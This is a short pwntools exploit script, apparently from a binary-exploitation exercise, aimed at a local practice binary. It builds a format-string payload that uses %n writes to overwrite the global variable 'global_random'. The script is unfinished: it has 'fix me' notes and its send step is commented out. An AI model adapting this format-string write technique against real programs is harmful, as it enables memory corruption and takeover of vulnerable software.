
from pwn import *

p = process("./8-fs-aw-64")

gr_addr = p.elf.symbols["global_random"] #always the same address this is what we need to overwrite

log.info(f"this is the gr address: {hex(gr_addr)}")

print(p.recv())
#print(len(payload))
payload = b"%7$x%8$x"
first = 0xb00c #fix me
second = 0xface
payload  = bytes("%{}x%13$n".format(first), 'utf-8')
payload  += bytes("%{}x%14$n".format(second), 'utf-8')
payload += b'AA'
#payload = b"||%7x||"

print(payload, len(payload))
print("=" * 80)
#TODO: up to this point, ensure payload is 8byte aligned

payload += p64(gr_addr)
payload += p64(gr_addr + 2)

print(payload, len(payload))
'''
p.sendline(payload)
print(p.recv())
p.wait()
'''